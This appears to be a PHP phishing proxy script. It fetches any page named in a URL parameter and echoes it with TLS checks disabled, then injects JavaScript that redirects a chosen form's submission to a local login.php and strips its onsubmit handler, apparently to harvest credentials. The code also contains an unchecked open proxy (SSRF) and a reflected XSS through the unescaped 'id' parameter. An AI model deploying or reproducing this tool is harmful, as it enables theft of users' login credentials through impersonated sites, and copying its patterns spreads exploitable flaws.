// Copyright (c) Marc Puttkammer
//

<?php
function proxyDoc( $url ) {
	$domain = substr($url, 0, strpos($url."/","/",8));
	$curlOpts = [
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_HEADER => false,
		CURLOPT_FOLLOWLOCATION => true,
		CURLOPT_SSL_VERIFYHOST => 0,
		CURLOPT_SSL_VERIFYPEER => false,
		CURLOPT_USERAGENT => $_SERVER[ "HTTP_USER_AGENT" ],
		CURLOPT_HTTPHEADER, [
			"Accept-Charset: ISO-8859-1, utf-8:q=0.7, *;q=0.7",
			"Content-Type: text/html",
			"Referer: " . $domain,
			"Origin: " . $domain
		]
	];
	$chead = curl_init( $url );
	curl_setopt_array( $chead, $curlOpts );
	$content = curl_errno( $chead );
	//$header = curl_getinfo( $chead );
	$doc = curl_exec( $chead );
	curl_close( $chead );
	echo $doc;
}

// r is the page to redirect to
// id is the id of the form to be changed
// 
$uri = $_GET[ "r" ]; //substr($_SERVER["REQUEST_URI"], strpos($_SERVER["REQUEST_URI"], ".php") + 5);
$id = $_GET[ "id" ];
proxyDoc( $uri );

echo "
  <script type=\"text/javascript\">
		var lForm = document.getElementById( \"" . $id . "\" ).getAttribute( \"action\");
		document.getElementById( \"" . $id . "\" ).setAttribute( \"action\", \"login.php?r=\" + lForm );
		document.getElementById( \"" . $id . "\" ).setAttribute( \"onsubmit\", \"\" );
	</script>";
?>
